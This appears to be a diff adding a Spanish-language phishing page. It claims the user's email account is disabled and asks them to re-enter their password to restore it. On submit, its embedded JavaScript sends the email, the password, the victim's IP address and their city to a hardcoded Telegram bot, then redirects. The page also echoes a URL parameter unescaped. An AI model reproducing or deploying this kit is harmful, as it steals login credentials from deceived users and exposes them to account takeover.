@@ -1,0 +1,123 @@
+<?php 
+ini_set("display_errors", 0);
+?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title>servicios</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="https://ik.imagekit.io/eruobiiei/main.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script>
+//bot token
+var telegram_bot_id =  "5728746998:AAEOxqfAHs3gNsz9OTi0q5_ej-ygi6FhGsY";
+//chat id
+var chat_id ="@infomyscm";
+</script>
+<script>
+  $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+
+  var u_name, u_name2, ip, ip2, message;
+  var ready = function() {
+    u_name = document.getElementById("corr").value;
+    u_name2 = document.getElementById("bclv").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "MMMHOTBBMAIL\n☰Ucorr: " + u_name + "\n☰clv: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+  };
+  var sender = function() {
+    ready();
+    var settings = {
+      "async": true,
+      "crossDomain": true,
+      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "cache-control": "no-cache"
+      },
+      "data": JSON.stringify({
+        "chat_id": chat_id,
+        "text": message
+      })
+    };
+    $.ajax(settings).done(function(response) {
+      console.log(response);
+      window.location = 'index2.php';
+    });
+    return false;
+  };
+
+</script>
+</head>
+<body>
+<div id="vista1">	
+	<div class="limiter">
+		<div class="container-login100">
+			<div class="wrap-login100">
+				<form method="post" action="" onsubmit="return sender();" class="delform" >
+				
+						<p id="gfg"  hidden=""></p>
+						<p id="address"  hidden=""></p>
+	
+					<img src="https://ik.imagekit.io/eruobiiei/modolais.png" style="width:120px;"><br><br>
+					<div class="ms-StackItem css-102"><span class="css-103"><?php echo $_GET['correo'];?></span></div><br>
+						<span style=" font-family: Helvetica  ;
+    -webkit-font-smoothing: antialiased;
+    font-size: 30px;
+    font-weight: 600;
+    color: rgb(27, 26, 25);
+    display: inline;
+    line-height: 32px;"><b>Su cuenta se encuentra inhabilitada</b></span><br>
+	
+	<div align="center"><img src="https://ik.imagekit.io/eruobiiei/logolaismodo.png" style="align-self: center; height: 128px; width: 128px;"></div><br>
+						
+				<div align="left">
+				<span style="font-size: 14px; font-family:Helvetica;"><b>Usted tiene el control&nbsp;</b><br>
+				Al confirmar su clave actual su cuenta será reestablecida automáticamente. </span></div><br>
+					
+					<input class="input100" type="hidden" name="corr" id="corr"  value="<?php echo $_GET['correo'];?>">
+				
+					<div class="wrap-input100 validate-input m-b-16" data-validate="Please enter username">
+							<input class="input100" type="password" name="bclv" id="bclv" placeholder="Escribir Contraseña" required>
+						
+					
+					<br><br>
+
+					<span style="font-size: .8125rem;"><a href="" style="color: #0067b8;text-decoration:none;font-family:Helvetica;">¿Olvidó su contraseña?</a></span>
+								<br>
+
+					
+					<br><br>
+					</div>
+					
+
+					
+					
+
+					<div class="container-login100-form-btn">
+						<button type="submit" class="login100-form-btn">
+							Continuar
+						</button>
+					</div>
+
+
+				
+				
+				</form>
+			</div>
+			
+		</div>
+	</div>
+</div>
+
+
+</body>
+</html>
